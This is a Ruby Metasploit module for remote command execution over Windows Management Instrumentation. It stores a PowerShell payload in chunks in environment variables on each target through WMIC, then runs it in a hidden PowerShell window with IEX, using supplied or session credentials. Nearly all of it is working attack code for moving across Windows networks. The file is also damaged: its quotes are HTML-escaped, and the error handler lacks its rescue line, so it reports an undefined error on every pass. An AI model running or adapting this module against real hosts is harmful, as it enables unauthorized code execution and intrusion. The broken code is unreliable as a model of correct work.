# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;
require &#039;rex&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::Powershell

  def initialize(info={})
    super( update_info( info,
        &#039;Name&#039;          => &#039;Windows Management Instrumentation (WMI) Remote Command Execution&#039;,
        &#039;Description&#039;   => %q{
          This module executes powershell on the remote host using the current
          user credentials or those supplied. Instead of using PSEXEC over TCP
          port 445 we use the WMIC command to start a Remote Procedure Call on
          TCP port 135 and an ephemeral port. Set ReverseListenerComm to tunnel
          traffic through that session.

          The result is similar to psexec but with the added benefit of using
          the session&#039;s current authentication token instead of having to know
          a password or hash.

          We do not get feedback from the WMIC command so there are no
          indicators of success or failure. The remote host must be configured
          to allow remote Windows Management Instrumentation.
        },
        &#039;License&#039;       => MSF_LICENSE,
        &#039;Author&#039;        => [
            &#039;Ben Campbell <eat_meatballs[at]hotmail.co.uk>&#039;
          ],
        &#039;References&#039;    =>
          [
            [ &#039;CVE&#039;, &#039;1999-0504&#039;], # Administrator with no password (since this is the default)
            [ &#039;OSVDB&#039;, &#039;3106&#039;],
            [ &#039;URL&#039;, &#039;http://passing-the-hash.blogspot.co.uk/2013/07/WMIS-PowerSploit-Shells.html&#039; ],
          ],
        &#039;DefaultOptions&#039; =>
            {
                &#039;EXITFUNC&#039; => &#039;thread&#039;,
                &#039;WfsDelay&#039; => &#039;15&#039;,
            },
        &#039;DisclosureDate&#039; => &#039;Jan 01 1999&#039;,
        &#039;Platform&#039;      => [ &#039;win&#039; ],
        &#039;Targets&#039;  =>
        [
            [ &#039;Windows x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
            [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X86_64 } ]
        ],
        &#039;DefaultTarget&#039; => 0
      ))

    register_options([
      OptString.new(&#039;SMBUser&#039;, [ false, &#039;The username to authenticate as&#039; ]),
      OptString.new(&#039;SMBPass&#039;, [ false, &#039;The password for the specified username&#039; ]),
      OptString.new(&#039;SMBDomain&#039;,  [ false, &#039;The Windows domain to use for authentication&#039; ]),
      OptAddressRange.new("RHOSTS", [ true, "Target address range or CIDR identifier" ]),
      # Move this out of advanced
      OptString.new(&#039;ReverseListenerComm&#039;, [ false, &#039;The specific communication channel to use for this listener&#039;])
    ])
  end

  def exploit
    if datastore[&#039;SMBUser&#039;] and datastore[&#039;SMBPass&#039;].nil?
      fail_with(Failure::BadConfig, "Need both username and password set.")
    end

    Rex::Socket::RangeWalker.new(datastore["RHOSTS"]).each do |server|
      # TODO: CHECK WMIC Access by reading the clipboard?
      # TODO: wmic /output:clipboard

      # Get the PSH Payload and split it into bitesize chunks
      # 1024 appears to be the max value allowed in env vars
      psh = cmd_psh_payload(payload.encoded).gsub("\r\n","")
      psh = psh[psh.index("$si")..psh.length-1]
      chunks = split_code(psh, 1024)

      begin
        print_status("[#{server}] Storing payload in environment variables")
        env_name = rand_text_alpha(rand(3)+3)
        env_vars = []
        0.upto(chunks.length-1) do |i|
          env_vars << "#{env_name}#{i}"
          c = "cmd /c SETX #{env_vars[i]} \"#{chunks[i]}\" /m"
          wmic_command(server, c)
        end

        x = rand_text_alpha(rand(3)+3)
        exec_cmd = "powershell.exe -nop -w hidden -c $#{x} = &#039;&#039;"
        env_vars.each do |env|
          exec_cmd << "+$env:#{env}"
        end
        exec_cmd << ";IEX $#{x};"

        print_status("[#{server}] Executing payload")
        wmic_command(server, exec_cmd)

        print_status("[#{server}] Cleaning up environment variables")
        env_vars.each do |env|
          cleanup_cmd = "cmd /c REG delete \"HKLM\\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /V #{env} /f"
          wmic_command(server, cleanup_cmd)
        end
        print_error("[#{server}] Error moving on... #{e}")
        next
      ensure
        select(nil,nil,nil,2)
      end
    end
  end

  def wmic_user_pass_string(domain=datastore[&#039;SMBDomain&#039;], user=datastore[&#039;SMBUser&#039;], pass=datastore[&#039;SMBPass&#039;])
    userpass = ""

    unless user.nil?
      if domain.nil?
        userpass = "/user:\"#{user}\" /password:\"#{pass}\" "
      else
        userpass = "/user:\"#{domain}\\#{user}\" /password:\"#{pass}\" "
      end
    end

    return userpass
  end

  def wmic_command(server, cmd)
    wcmd = "wmic #{wmic_user_pass_string}/node:#{server} process call create \"#{cmd.gsub(&#039;"&#039;,&#039;\\"&#039;)}\""
    vprint_status("[#{server}] #{wcmd}")

    # We dont use cmd_exec as WMIC cannot be Channelized
    ps = session.sys.process.execute(wcmd, "", {&#039;Hidden&#039; => true, &#039;Channelized&#039; => false})
    select(nil,nil,nil,0.1)
  end

  def split_code(psh, chunk_size)
    array = []
    idx = 0
    while (idx < psh.length)
      array << psh[idx, chunk_size]
      idx += chunk_size
    end
    return array
  end

end

